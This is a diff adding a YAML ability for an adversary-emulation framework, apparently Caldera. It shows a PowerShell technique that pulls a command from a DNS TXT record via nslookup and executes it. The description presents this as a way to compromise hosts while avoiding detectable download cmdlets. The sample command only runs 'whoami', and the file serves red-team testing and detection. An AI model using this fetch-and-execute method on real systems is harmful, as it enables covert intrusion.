@@ -1,0 +1,23 @@
+---
+- id: e2e6f33cf77d10e3c82c244014da20c5
+  name: Abuse Nslookup with DNS Records
+  description: 'Red teamer''s avoid IEX and Invoke-WebRequest in your PowerShell commands.
+    Instead, host a text record with a payload to compromise hosts.
+
+    [reference](https://twitter.com/jstrosch/status/1237382986557001729)
+
+    '
+  tactic: execution
+  technique:
+    attack_id: T1059.001
+    name: 'Command and Scripting Interpreter: PowerShell'
+  platforms:
+    windows:
+      psh:
+        command: function nslookup  { &"$env:windir\system32\nslookup.exe" @args |
+          Out-Null; @("","whoami")}; powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
